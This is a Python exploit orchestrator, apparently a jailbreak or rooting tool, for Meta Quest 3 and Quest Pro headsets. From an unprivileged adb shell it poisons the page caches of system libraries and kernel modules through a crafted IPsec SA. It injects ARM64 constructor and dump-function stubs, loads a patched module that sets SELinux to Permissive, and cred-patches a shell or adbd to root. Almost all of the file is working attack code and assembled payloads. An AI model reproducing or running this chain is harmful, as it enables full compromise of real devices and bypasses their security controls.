#!/usr/bin/env python3
# ============================================================================================
#  DIRTYFRAG-LPE  —  unprivileged (uid2000 shell) SELinux Enforcing->Permissive + root
#  ONE orchestrator, ALL devices. Everything firmware/device-specific lives in targets/<name>.json;
#  the target's kernel.merged flag selects the flow. Quest 3 AND Quest Pro run from this same file.
#
#  Two-carrier flow  (Quest 3, 5.10, kernel.merged=false):
#    [shell] stage Dirty-Frag IpSec SA
#    [shell] poison inject-lib (libeva) init_array ctor -> 2-file page-cache poison (in hal_tracking)
#    [shell] poison libandroid_servers::dump -> ctl.restart stub (in system_server)
#    [shell] dumpsys input  -> restart trackingservice -> ctor poisons carrier .ko + cfg
#    [shell] ctl.start insmod_sh -> finit poisoned carrier -> enforcing=0 ; postex: usbip cred carrier
#
#  Merged flow  (Quest Pro, 4.19, kernel.merged=true):
#    only one not-loaded module has a big-enough init (rdbg), so build_credmod diff-patches it into
#    enforcing=0 + status-sync + cred-patch(waiting-shell pid) and it is loaded ONCE. The carrier is
#    poisoned by a 1-file init_array ctor (libgralloc.qti) since shell can't read vendor_file under
#    Enforcing; the cfg IS shell-readable so shell poisons it directly. One load -> Permissive + root.
#
#  Add a new firmware: run port.py (it emits the right shape) — drop the carrier .ko + cfg under
#  targets/<name>/ and the JSON. No code changes.
# ============================================================================================
import argparse, json, os, re, struct, subprocess, sys, time, threading
# AES-128 for the Dirty-Frag keystream. Fast path = pycryptodome; if absent, fall back to a
# self-contained pure-Python AES-128 (verified vs pycryptodome + FIPS-197) so the tool has NO hard
# third-party dependency and runs on any Python (Windows without a C compiler included).
try:
    from Crypto.Cipher import AES
    def _aes128(key16): return AES.new(key16, AES.MODE_ECB).encrypt   # -> encrypt(block)->16B
except ModuleNotFoundError:
    _SBOX = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")
    _RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
    def _xt(a): return ((a<<1)^0x1b)&0xff if a&0x80 else (a<<1)
    def _expand(key):
        w=[list(key[i*4:i*4+4]) for i in range(4)]
        for i in range(4,44):
            t=list(w[i-1])
            if i%4==0:
                t=t[1:]+t[:1]; t=[_SBOX[b] for b in t]; t[0]^=_RCON[i//4-1]
            w.append([w[i-4][j]^t[j] for j in range(4)])
        return w
    def _enc(w, blk):
        s=[list(blk[i*4:i*4+4]) for i in range(4)]
        for c in range(4):
            for j in range(4): s[c][j]^=w[c][j]
        for rnd in range(1,10):
            s2=[[_SBOX[s[c][j]] for j in range(4)] for c in range(4)]
            rows=[[s2[c][j] for c in range(4)] for j in range(4)]
            rows=[rows[j][j:]+rows[j][:j] for j in range(4)]
            cols=[[rows[j][c] for j in range(4)] for c in range(4)]
            s=[]
            for a in cols:
                s.append([_xt(a[0])^_xt(a[1])^a[1]^a[2]^a[3],
                          a[0]^_xt(a[1])^_xt(a[2])^a[2]^a[3],
                          a[0]^a[1]^_xt(a[2])^_xt(a[3])^a[3],
                          _xt(a[0])^a[0]^a[1]^a[2]^_xt(a[3])])
            for c in range(4):
                for j in range(4): s[c][j]^=w[rnd*4+c][j]
        s2=[[_SBOX[s[c][j]] for j in range(4)] for c in range(4)]
        rows=[[s2[c][j] for c in range(4)] for j in range(4)]
        rows=[rows[j][j:]+rows[j][:j] for j in range(4)]
        s=[[rows[j][c] for j in range(4)] for c in range(4)]
        for c in range(4):
            for j in range(4): s[c][j]^=w[40+c][j]
        return bytes(s[c][j] for c in range(4) for j in range(4))
    def _aes128(key16):
        w = _expand(key16)
        return lambda blk: _enc(w, blk)

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from toolconf import CLANG                     # only clang is needed to build (see elfutil)
from elfutil import obj_section_and_syms        # pure-Python ELF read -> no llvm-objcopy/readelf needed
DEX = os.path.join(HERE, "e2e.dex")
BUILD = os.path.join(HERE, "build")

# 52-byte carrier init patch template (relocation-free): paciasp; adr x1,anchor; ldr w2,[x1];
# sbfx; b skip; anchor:bl<reloc>; add x1,x1,w2,sxtw#2; movz x2,#D0; movk x2,#D1,lsl16;
# add x1,x1,x2; strb wzr,[x1]; autiasp; ret.  movz@0x1c / movk@0x20 patched from DELTA.
PATCH_INIT = bytes.fromhex(
    "3f2303d5" "81000010" "220040b9" "42644093"
    "02000014" "00000094" "21c8228b" "025199d2"
    "823da0f2" "2100028b" "3f000039" "bf2303d5"
    "c0035fd6")
R_AARCH64_CALL26 = 0x11b

# ---- Dirty-Frag keystream (matches Stager/Writer) ----
def keystream0_fn(keymat_base):
    KEYMAT = bytes((keymat_base + i) & 0xff for i in range(20))
    enc = _aes128(KEYMAT[:16]); SALT = KEYMAT[16:20]
    return lambda iv: enc(SALT + iv + b"\x00\x00\x00\x02")[0]

# ============================== logging ==============================
C = dict(r="\033[0m", b="\033[1m", dim="\033[2m", red="\033[31m", grn="\033[32m",
         yel="\033[33m", blu="\033[34m", mag="\033[35m", cyn="\033[36m", gry="\033[90m")
if not sys.stdout.isatty(): C = {k: "" for k in C}
_t0 = time.time()
def _ts(): return f"{C['gry']}[{time.time()-_t0:6.1f}s]{C['r']}"
def banner(txt):
    line = "═" * (len(txt) + 2)
    print(f"\n{C['cyn']}{C['b']}╔{line}╗\n║ {txt} ║\n╚{line}╝{C['r']}")
def step(txt):  print(f"{_ts()} {C['blu']}{C['b']}▸{C['r']} {C['b']}{txt}{C['r']}")
def ok(txt):    print(f"{_ts()} {C['grn']}  ✓ {txt}{C['r']}")
def info(txt):  print(f"{_ts()} {C['gry']}    {txt}{C['r']}")
def warn(txt):  print(f"{_ts()} {C['yel']}  ! {txt}{C['r']}")
def err(txt):   print(f"{_ts()} {C['red']}{C['b']}  ✗ {txt}{C['r']}")
def win(txt):   print(f"{_ts()} {C['grn']}{C['b']}  ★ {txt}{C['r']}")

# ============================== adb ==============================
class ADB:
    def __init__(self, serial): self.s = serial
    def _run(self, args, **kw):
        return subprocess.run(["adb", "-s", self.s] + args, capture_output=True, text=True, **kw)
    def sh(self, cmd):    return self._run(["shell", cmd]).stdout.strip()
    def su(self, cmd):    return self._run(["shell", f'su -c "{cmd}"']).stdout.strip()
    def push(self, l, r): return self._run(["push", l, r])
    def getprop(self, p): return self.sh(f"getprop {p}")
    def alive(self):      return self._run(["get-state"]).stdout.strip() == "device"
    def read_region(self, path, off, n):
        import base64
        out = self._run(["shell", f"dd if={path} bs=1 skip={off} count={n} 2>/dev/null | base64"]).stdout
        return base64.b64decode(out)

def pick_device(target, override):
    r = subprocess.run(["adb", "devices"], capture_output=True, text=True).stdout
    serials = [l.split()[0] for l in r.splitlines()[1:] if "\tdevice" in l]
    if override:
        if override not in serials: err(f"device {override} not connected"); sys.exit(1)
        return override
    want = target["device"]["build_incremental"]
    for s in serials:
        if ADB(s).getprop("ro.build.version.incremental") == want: return s
    err(f"no connected device matches build {want}; use --device"); sys.exit(1)

# ============================== ELF helpers ==============================
def elf_sections(data):
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    shentsz, shnum, shstrndx = struct.unpack_from("<HHH", data, 0x3a)
    secs = []
    for i in range(shnum):
        off = e_shoff + i * shentsz
        name, = struct.unpack_from("<I", data, off)
        sh_off, sh_size = struct.unpack_from("<QQ", data, off + 24)
        secs.append([name, sh_off, sh_size])
    strtab_off = secs[shstrndx][1]
    named = {}
    for name, o, s in secs:
        end = data.index(b"\0", strtab_off + name)
        named[data[strtab_off + name:end].decode()] = (o, s)
    return named

# ============================== builds ==============================
def hx(v): return int(v, 16) if isinstance(v, str) else v

def build_patch_init(delta):
    p = bytearray(PATCH_INIT)
    imm0, imm1 = delta & 0xffff, (delta >> 16) & 0xffff
    struct.pack_into("<I", p, 0x1c, 0xD2800002 | (imm0 << 5))   # movz x2,#imm0
    struct.pack_into("<I", p, 0x20, 0xF2A00002 | (imm1 << 5))   # movk x2,#imm1,lsl16
    return bytes(p)

def build_carrier(tgt, tdir):
    c = tgt["carrier"]
    ko = os.path.join(tdir, c["local_ko"])
    data = bytearray(open(ko, "rb").read())
    secs = elf_sections(data)
    it_off, it_size = secs[".init.text"]
    rela_off, rela_size = secs[".rela.init.text"]
    assert it_size >= len(PATCH_INIT), f".init.text {it_size} < patch {len(PATCH_INIT)}"
    anchor_off = hx(c["anchor_reloc_off"])
    delta = hx(tgt["kernel"]["delta_selinux_from_anchor"])
    # 1) splice patched init
    data[it_off:it_off + len(PATCH_INIT)] = build_patch_init(delta)
    # 2) fix relocations: repoint the CALL26 anchor, NONE the rest within the patched region
    n = rela_size // 24; call26 = 0
    for i in range(n):
        e = rela_off + i * 24
        r_off, r_info = struct.unpack_from("<QQ", data, e)
        typ = r_info & 0xffffffff
        if typ == R_AARCH64_CALL26:
            struct.pack_into("<Q", data, e, anchor_off); call26 += 1
        elif r_off < len(PATCH_INIT):
            struct.pack_into("<Q", data, e + 8, 0)       # -> R_AARCH64_NONE
    assert call26 == 1, f"expected exactly one CALL26 anchor, found {call26}"
    out = os.path.join(BUILD, "carrier_patched.ko")
    open(out, "wb").write(data)
    return out, data

def build_cfg(tgt, tdir, insmod_path=None):
    c = tgt["cfg"]
    orig = bytearray(open(os.path.join(tdir, c["local_cfg"]), "rb").read())
    path = insmod_path if insmod_path else tgt["carrier"]["device_path"]
    line = b"insmod|" + path.encode() + b"\n"
    off = hx(c["inject_off"]); region = c["inject_len"]           # bounded region (whole cfg lines)
    if region < len(line):
        err(f"cfg inject_len {region} < insmod line {len(line)}B at 0x{off:x}"); sys.exit(1)
    if off + region > len(orig) - 17:
        warn("inject region ends within 17B of EOF (sendfile tail limit) — move inject_off earlier")
    newblk = line + b"#" * (region - len(line) - 1) + b"\n"       # pad to region with a comment line
    assert len(newblk) == region
    patched = bytearray(orig); patched[off:off + region] = newblk
    return orig, bytes(patched)

def assemble(src_text, name):
    s = os.path.join(BUILD, name + ".S"); o = os.path.join(BUILD, name + ".o")
    open(s, "w").write(src_text)
    subprocess.run([CLANG, "-target", "aarch64-linux-gnu", "-c", s, "-o", o], check=True,
                   capture_output=True)
    return obj_section_and_syms(o, ".stub")   # pure-Python: .stub bytes + {label: offset} (no objcopy/readelf)

def inj(tgt):
    # generic injection lib (Q3 targets say "libeva"; QPro says "inject_lib"). Same sub-fields.
    return tgt.get("inject_lib") or tgt["libeva"]

# init_array ctor stub: opens N vendor page caches (whose SELinux label the injected daemon can read
# but shell cannot under Enforcing) and page-cache-poisons each via the shell-staged Dirty-Frag SA.
# Runs inside a same_process_hal_file lib's ctor when the tracking daemon restarts, then tail-calls
# the original ctor. Table sizes are dynamic (exactly the diff count) so 1 file (QPro merged rdbg,
# 243 diffs) or 2 files (Q3 carrier+cfg) fit the same builder — bounded only by the lib's exec gap.
def _stub_asm(spi_bytes, dev_paths):
    spihdr = ",".join(f"0x{b:02x}" for b in spi_bytes) + ",0x00,0x00,0x00,0x01"
    fileblk = ""
    for i in range(len(dev_paths)):
        fileblk += f"""
    mov     x0, #-100
    adr     x1, path{i}
    mov     w2, wzr
    mov     w3, wzr
    mov     x8, #56
    svc     #0
    mov     x19, x0
    adr     x21, table{i}
    adr     x0, cnt{i}
    ldr     w22, [x0]
    bl      sendloop
    mov     x0, x19
    mov     x8, #57
    svc     #0
"""
    data = ""
    for i, p in enumerate(dev_paths):
        data += f'cnt{i}:  .word 0\npath{i}:\n    .asciz "{p}"\n.balign 4\ntable{i}:\n    .space 0\n'
    return f""".section .stub,"ax"
.globl _stub
_stub:
    bti     c
    sub     sp, sp, #112
    stp     x19, x20, [sp, #32]
    stp     x21, x22, [sp, #48]
    stp     x23, x24, [sp, #64]
    str     x30, [sp, #24]
    adr     x0, spihdr
    ldr     x0, [x0]
    str     x0, [sp, #0]
    mov     w0, #2
    mov     w1, #2
    mov     w2, wzr
    mov     x8, #198
    svc     #0
    mov     x20, x0
    mov     x0, x20
    adr     x1, sockaddr
    mov     w2, #16
    mov     x8, #203
    svc     #0
{fileblk}
    ldr     x30, [sp, #24]
    ldp     x19, x20, [sp, #32]
    ldp     x21, x22, [sp, #48]
    ldp     x23, x24, [sp, #64]
    add     sp, sp, #112
tailcall:
    .word   0
sendloop:
    mov     x23, x30
sl_loop:
    ldr     w0, [x21]
    str     x0, [sp, #16]
    ldur    x1, [x21, #4]
    str     x1, [sp, #8]
    mov     x0, x20
    mov     x1, sp
    mov     w2, #16
    mov     w3, #0x8000
    mov     x4, xzr
    mov     x5, xzr
    mov     x8, #206
    svc     #0
    mov     x0, x20
    mov     x1, x19
    add     x2, sp, #16
    mov     w3, #17
    mov     x8, #71
    svc     #0
    mov     x0, x20
    mov     x1, xzr
    mov     w2, wzr
    mov     w3, wzr
    mov     x4, xzr
    mov     x5, xzr
    mov     x8, #206
    svc     #0
    add     x21, x21, #12
    subs    w22, w22, #1
    b.ne    sl_loop
    ret     x23
.balign 8
spihdr:
    .byte {spihdr}
sockaddr:
    .byte 0x02,0x00
    .byte 0x00,0x00
    .byte 0x7f,0x00,0x00,0x01
    .byte 0,0,0,0,0,0,0,0
{data}"""

def build_inject_stub(tgt, port, files):
    # files = [(device_path, cur_bytes, want_bytes), ...]  (1 for QPro merged, 2 for Q3)
    lv = inj(tgt)
    spi = hx(tgt["dirtyfrag"]["sa_spi"])
    spi_bytes = bytes([(spi >> 24) & 0xff, (spi >> 16) & 0xff, (spi >> 8) & 0xff, spi & 0xff])
    def difftable(cur, want): return [(i, cur[i] ^ want[i]) for i in range(len(want)) if cur[i] != want[i]]
    diffs = [difftable(cur, want) for (_, cur, want) in files]
    # assemble with placeholder table sizes, then re-emit with real sizes (labels resolve regardless)
    raw, syms = assemble(_stub_asm(spi_bytes, [f[0] for f in files]), "inject_stub")
    # patch the .space table sizes by re-assembling with exact sizes baked in
    src = _stub_asm(spi_bytes, [f[0] for f in files])
    for i, d in enumerate(diffs):
        src = src.replace(f"table{i}:\n    .space 0", f"table{i}:\n    .space {len(d) * 12}")
    raw, syms = assemble(src, "inject_stub")
    ks0 = keystream0_fn(hx(tgt["dirtyfrag"]["keymat_base"]))
    import random; rnd = random.Random(0xC0FFEE)
    def ivf(need):
        while True:
            iv = bytes(rnd.getrandbits(8) for _ in range(8))
            if ks0(iv) == need: return iv
    for i, d in enumerate(diffs):
        off = syms[f"table{i}"]
        for j, (o, need) in enumerate(d):
            e = off + j * 12; raw[e:e + 4] = struct.pack("<I", o); raw[e + 4:e + 12] = ivf(need)
        struct.pack_into("<I", raw, syms[f"cnt{i}"], len(d))
    gap = hx(lv["stub_gap_off"]); orig_ctor = hx(lv["orig_ctor_off"])
    if len(raw) > lv["stub_gap_size"]:
        err(f"stub {len(raw)}B > inject-lib gap {lv['stub_gap_size']}B (pick a lib with a bigger exec gap)"); sys.exit(1)
    imm = ((orig_ctor - (gap + syms["tailcall"])) >> 2) & 0x03ffffff
    struct.pack_into("<I", raw, syms["tailcall"], 0x14000000 | imm)
    struct.pack_into(">H", raw, syms["sockaddr"] + 2, port)
    ia = hx(lv["init_array_off"])
    spec = bytearray()
    for i, b in enumerate(raw): spec += struct.pack("<I", gap + i) + bytes([b])
    for i, b in enumerate(struct.pack("<Q", gap)): spec += struct.pack("<I", ia + i) + bytes([b])
    return bytes(raw), bytes(spec), [len(d) for d in diffs]

def build_libas_stub(tgt):
    la = tgt["libandroid_servers"]
    sock = tgt["property_socket"].encode()
    ctl = "ctl.restart"; svc = tgt["services"]["tracking"]
    msg = struct.pack("<I", 0x00020001) + struct.pack("<I", len(ctl)) + ctl.encode() \
          + struct.pack("<I", len(svc)) + svc.encode()
    msg_bytes = "\n".join("    .byte " + ",".join(f"0x{b:02x}" for b in msg[i:i+8])
                          for i in range(0, len(msg), 8))
    saddrlen = 2 + len(sock) + 1
    tmpl = open(os.path.join(HERE, "asm", "libas_restart.S.tmpl")).read()
    src = tmpl.replace("@PROP_SOCKET@", tgt["property_socket"]) \
              .replace("@CTL_DESC@", f"{ctl}={svc}") \
              .replace("@SADDRLEN@", str(saddrlen)).replace("@MSGLEN@", str(len(msg))) \
              .replace("@MSG@", msg_bytes)
    raw, _ = assemble(src, "libas_restart")
    dump = hx(la["dump_off"])
    if len(raw) > hx(la["dump_size"]):
        err(f"libas stub {len(raw)}B > dump fn {hx(la['dump_size'])}B"); sys.exit(1)
    spec = bytearray()
    for i, b in enumerate(raw): spec += struct.pack("<I", dump + i) + bytes([b])
    return bytes(raw), bytes(spec)

# ---- restore specs (revert the code-injection poisons, shell-only, no reboot) ----
def inject_restore_spec(tgt, stub_len):
    lv = inj(tgt)
    gap = hx(lv["stub_gap_off"]); ia = hx(lv["init_array_off"])
    orig = hx(lv["orig_ctor_off"])
    spec = bytearray()
    for i in range(stub_len): spec += struct.pack("<I", gap + i) + b"\x00"       # gap -> zeros
    for i, b in enumerate(struct.pack("<Q", orig)): spec += struct.pack("<I", ia + i) + bytes([b])  # init_array[0] -> orig ctor
    return bytes(spec)

def libas_restore_spec(tgt, orig_bytes):
    dump = hx(tgt["libandroid_servers"]["dump_off"])
    spec = bytearray()
    for i, b in enumerate(orig_bytes): spec += struct.pack("<I", dump + i) + bytes([b])
    return bytes(spec)

# ============================== device ops ==============================
def adbd_pid(adb):
    p = adb.sh("pidof adbd").split()
    return p[0] if p and p[0].isdigit() else None

def credmod_args(tgt, carrier_local_ko, pid, out, ctx=False):
    # shared build_credmod invocation; ctx=True also patches SELinux context -> kernel (needs
    # kernel.cred_security_off in the target). Used for both the merged carrier and the Q3 cred carrier.
    k = tgt["kernel"]
    args = [sys.executable, os.path.join(HERE, "build_credmod.py"), carrier_local_ko, out,
            k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"], k["delta_pidtask_from_anchor"],
            str(pid), k["delta_ssuse_from_anchor"], str(k["enforcing_off"]), k.get("cred_off", "0x778")]
    if ctx:
        if not k.get("cred_security_off"):
            err("--adb-root needs kernel.cred_security_off in the target JSON"); sys.exit(1)
        args.append(k["cred_security_off"])
    return args

def disable_phantom(adb):
    # stop Android's phantom-process monitor from SIGKILLing our long app_process Writer loops
    adb.sh("device_config put activity_manager max_phantom_processes 2147483647 2>/dev/null; "
           "settings put global settings_enable_monitor_phantom_procs false 2>/dev/null; "
           "device_config set_sync_disabled_for_tests persistent 2>/dev/null; true")

def poison(adb, dev_path, spec, tag, retries=8):
    sp = os.path.join(BUILD, tag + ".spec"); open(sp, "wb").write(spec)
    adb.push(sp, f"/data/local/tmp/{tag}.spec")
    total = len(spec) // 5
    out = ""
    for attempt in range(1, retries + 1):
        # Writer is idempotent (skips bytes already == target) and uses a random SPI, so a
        # phantom-killed partial run is safe to re-run; retry until all records are accounted for.
        out = adb.sh(f"cd /data/local/tmp && CLASSPATH=e2e.dex app_process / q3.Writer {dev_path} /data/local/tmp/{tag}.spec")
        m = re.search(r"wrote=(\d+) skipped=(\d+)", out)
        if m and int(m.group(1)) + int(m.group(2)) == total:
            info(f"{tag}: wrote={m.group(1)} skipped={m.group(2)}" + (f"  ({attempt} tries)" if attempt > 1 else ""))
            return
        if attempt < retries:
            warn(f"{tag}: writer incomplete (attempt {attempt}/{retries}) — retrying")
            import time as _t; _t.sleep(2)   # let a stale SA reap
    err(f"{tag} poison failed after {retries} attempts: ...{out[-160:]}"); sys.exit(1)

class Stager:
    def __init__(self, serial): self.serial = serial; self.p = None; self.port = None
    def start(self):
        self.p = subprocess.Popen(["adb", "-s", self.serial, "shell",
            "cd /data/local/tmp && CLASSPATH=e2e.dex exec app_process / q3.Stager 1800"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for _ in range(80):
            line = self.p.stdout.readline()
            if not line:
                if self.p.poll() is not None: break
                continue
            m = re.search(r"ENCAPPORT=(\d+)", line)
            if m: self.port = int(m.group(1)); return self.port
        return None
    def stop(self):
        if self.p and self.p.poll() is None:
            self.p.terminate()
            try: self.p.wait(3)
            except Exception: self.p.kill()

class WaitShell:
    # A persistent adb shell that publishes its pid, waits for a 'go' file, then execs postex.sh.
    # pe.ko cred-patches this pid -> it becomes uid 0 -> runs postex.sh as root.
    def __init__(self, serial, skip_magisk, carrier_mods=""):
        self.serial = serial; self.p = None; self.pid = None
        self.skip = "1" if skip_magisk else "0"; self.mods = carrier_mods
    def start(self):
        subprocess.run(["adb","-s",self.serial,"shell","rm -f /data/local/tmp/pepid /data/local/tmp/pego /data/local/tmp/postex_done"])
        self.p = subprocess.Popen(["adb","-s",self.serial,"shell",
            "echo $$ > /data/local/tmp/pepid; while [ ! -f /data/local/tmp/pego ]; do sleep 0.2; done; "
            f"SKIP_MAGISK={self.skip} CARRIER_MODS='{self.mods}' sh /data/local/tmp/postex.sh"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for _ in range(50):
            pid = subprocess.run(["adb","-s",self.serial,"shell","cat /data/local/tmp/pepid 2>/dev/null"],
                                 capture_output=True, text=True).stdout.strip()
            if pid.isdigit(): self.pid = int(pid); return self.pid
            time.sleep(0.2)
        return None
    def release(self): subprocess.run(["adb","-s",self.serial,"shell","touch /data/local/tmp/pego"])
    def stop(self):
        if self.p and self.p.poll() is None:
            self.p.terminate()
            try: self.p.wait(3)
            except Exception: self.p.kill()

# ============================== phases ==============================
def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
    # MERGED single-carrier chain (Quest Pro 4.19). One not-loaded module with a big-enough init
    # (rdbg, 680B) is diff-patched by build_credmod into enforcing=0 + status-page sync + cred-patch
    # of a waiting shell, then loaded once. The carrier is vendor_file (shell can't read it under
    # Enforcing) so it is poisoned by an init_array ctor injected into a trackingservice-mapped
    # same_process_hal_file lib; the cfg IS shell-readable under Enforcing here, so shell poisons it.
    tdir = os.path.join(HERE, "targets"); os.makedirs(BUILD, exist_ok=True)
    k = tgt["kernel"]; carrier = tgt["carrier"]; cfg = tgt["cfg"]
    banner(f"DIRTYFRAG-LPE (merged)   target: {tgt['name']}")
    info(tgt["description"])
    serial = pick_device(tgt, device_override); adb = ADB(serial)
    step("Preflight")
    dev_build = adb.getprop("ro.build.version.incremental")
    (ok if dev_build == tgt["device"]["build_incremental"] else warn)(f"device {serial}  build {dev_build}")
    before = adb.sh("getenforce")
    info(f"uid={adb.sh('id -u')}  getenforce={before}  (merged chain: rdbg carrier, enforcing@+{k['enforcing_off']}, cred@{k.get('cred_off','0x778')})")
    if before != "Enforcing": warn(f"SELinux already {before} (chain assumes Enforcing; will still run)")
    if not os.path.exists(DEX): err("e2e.dex missing"); sys.exit(1)
    adb.push(DEX, "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex")
    disable_phantom(adb)

    banner("STAGE  (shell: Dirty-Frag SA)")
    stager = Stager(serial)
    step(f"Staging attacker-keyed AES-GCM ESP SA ({tgt['dirtyfrag']['sa_spi']})")
    port = stager.start()
    if not port: err("stager failed (stale SA? reboot to clear xfrm)"); stager.stop(); sys.exit(1)
    ok(f"SA live, encap port {port}")

    eva_stub_len = 0; orig_las = b""; success = False; _reverted = [False]
    def do_revert():
        # Restore the code-injection poisons (core inject lib + libandroid dump). Idempotent and
        # SA-independent (poison() self-stages its own Writer SA), so it is safe to call early AND
        # again in finally. Reverting the CORE inject lib ASAP is what keeps a failed run from
        # crash-looping the device on graphics processes that re-dlopen it.
        if _reverted[0]: return
        _reverted[0] = True
        if eva_stub_len:
            poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
        if orig_las:
            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
    adb_root = (cleanup == "adb-root"); wsh = None
    try:
        if adb_root:
            # target the running adbd: cred-patch it to uid0+caps+kernel-context so every NEW adb shell
            # is full root under Permissive. No waiting shell / postex.
            pid = adbd_pid(adb)
            if not pid: err("could not find adbd pid"); stager.stop(); return
            step(f"Target: adbd pid {pid} (cred-patch -> uid0 + all caps + kernel context)")
        else:
            # waiting shell FIRST — its pid is baked into the merged carrier's cred-patch
            step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)")
            cmod = os.path.basename(carrier["device_path"])[:-3].replace("-", "_")
            wsh = WaitShell(serial, skip_magisk, cmod); pid = wsh.start()
            if not pid: err("waiting shell failed"); stager.stop(); return
            ok(f"waiting shell pid {pid}")

        banner("BUILD  (host)")
        step("Merged carrier (build_credmod: enforcing=0 + status-sync + cred-patch"
             + (" + kernel-context" if adb_root else "") + ", anchor-relative)")
        credko = os.path.join(BUILD, "carrier_merged.ko")
        cc = os.path.join(tdir, carrier["local_ko"])
        r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=adb_root), capture_output=True, text=True)
        if r.returncode:
            err("build_credmod failed: " + r.stderr + r.stdout)
            (wsh and wsh.stop()); stager.stop(); return
        ok(r.stdout.strip().split(": ", 1)[-1])
        carrier_want = open(credko, "rb").read(); carrier_cur = open(cc, "rb").read()
        step("init.insmod.cfg  (+insmod line for the carrier)")
        cfg_cur, cfg_want = build_cfg(tgt, tdir)
        ok(f"cfg patched  ({sum(1 for i in range(len(cfg_want)) if cfg_want[i]!=cfg_cur[i])} diff bytes)")

        banner("POISON  (shell -> page caches)")
        # carrier (rdbg, vendor_file): via init_array ctor injected into a trackingservice lib.
        # NOTE the inject lib (e.g. libgralloc.qti) is a CORE lib loaded by many graphics procs, so
        # this poison is reverted the instant the ctor has done its job (see EARLY REVERT below) to
        # keep the blast radius to a few seconds and off the module-load path.
        step("inject-lib stub  (init_array[0] -> 1-file carrier poison in the gap)")
        eva_raw, eva_spec, cnts = build_inject_stub(tgt, port,
            [(carrier["device_path"], carrier_cur, carrier_want)])
        eva_stub_len = len(eva_raw)
        info(f"stub {len(eva_raw)}B  (carrier IVs={cnts[0]})  gap fits {inj(tgt)['stub_gap_size']}B")
        poison(adb, inj(tgt)["device_path"], eva_spec, "inject")
        step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)")
        las_raw, las_spec = build_libas_stub(tgt)
        orig_las = adb.read_region(tgt["libandroid_servers"]["device_path"],
                                   hx(tgt["libandroid_servers"]["dump_off"]), len(las_raw))
        poison(adb, tgt["libandroid_servers"]["device_path"], las_spec, "libas")

        banner("TRIGGER  (shell)")
        tsvc = tgt["services"]["tracking"]; isvc = tgt["services"]["insmod_sh"]
        step(f"dumpsys input  ->  system_server restarts {tsvc}  ->  ctor poisons carrier")
        pid0 = adb.sh(f"pidof {tsvc}")
        adb.sh("dumpsys input >/dev/null 2>&1")
        pid1 = pid0
        for _ in range(20):
            time.sleep(1); pid1 = adb.sh(f"pidof {tsvc}")
            if pid1 and pid1 != pid0: break
        if pid1 == pid0 or not pid1:
            err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); return
        ok(f"{tsvc} restarted  pid {pid0} -> {pid1}")
        info(f"settling {settle}s for the ctor's carrier poison to complete")
        time.sleep(settle)

        # EARLY REVERT: the ctor has now poisoned rdbg's page cache; the core inject lib is no longer
        # needed, so restore it (and libandroid) BEFORE the module load. This removes the crash-prone
        # core-lib poison from the rest of the run.
        step("Reverting inject-lib + libandroid poison (ctor done; before module load)")
        do_revert()

        # cfg: shell-readable under Enforcing on this target -> poison directly from shell, LATE
        # (right before the trigger) so the single 227B cfg page isn't evicted during the settle.
        step("init.insmod.cfg  (shell-direct; readable under Enforcing here)")
        adb.sh(f"cat {cfg['device_path']} >/dev/null 2>&1")   # prime page cache
        off = hx(cfg["inject_off"]); ln = cfg["inject_len"]
        cfg_spec = bytearray()
        for i in range(off, off + ln): cfg_spec += struct.pack("<I", i) + bytes([cfg_want[i]])
        poison(adb, cfg["device_path"], bytes(cfg_spec), "cfg")

        step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
        adb.sh(f"setprop ctl.start {isvc}")

        banner("VERIFY  (enforcing flip + root)")
        rooted = False; uline = ""
        for _ in range(20):
            time.sleep(1)
            if adb_root:                                   # a FRESH adb shell inherits adbd's new creds
                if adb.sh("id -u") == "0": rooted = True; break
            else:
                uline = adb.sh(f"grep -m1 Uid /proc/{wsh.pid}/status 2>/dev/null")
                if uline.split()[1:2] == ["0"]: rooted = True; break
        after = adb.sh("getenforce")
        if after == "Permissive":
            win(f"SELinux {before} -> {after}   (zero root)")
            if rooted:
                if adb_root: win(f"adbd (pid {pid}) cred-patched -> NEW adb shells are uid 0 + kernel ctx")
                else:        win(f"waiting shell {wsh.pid} cred-patched -> uid 0")
                success = True
            else:
                err("permissive but " + ("adb shell not root yet" if adb_root
                    else f"shell not cred-patched — {uline or 'no Uid line'}"))
        else:
            err(f"getenforce={after} (expected Permissive) — carrier load failed / did not run")
    except Exception:
        raise
    finally:
        do_revert()                 # safety net: guarantee the core inject lib is clean on every path
        stager.stop(); ok("stager stopped (SA reaped)")

    if not success:
        (wsh and wsh.stop())
        err("merged chain did NOT complete — inject/libandroid poisons reverted.")
        warn("if the DEVICE crashed/rebooted after this, grab the panic log once it is back:")
        warn("  su -c 'cat /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0 /proc/last_kmsg 2>/dev/null'")
        warn("  su -c 'lsmod | grep rdbg; dmesg | grep -iE \"rdbg|module|sig|avc\" | tail -40'")
        return

    if cleanup == "postex":
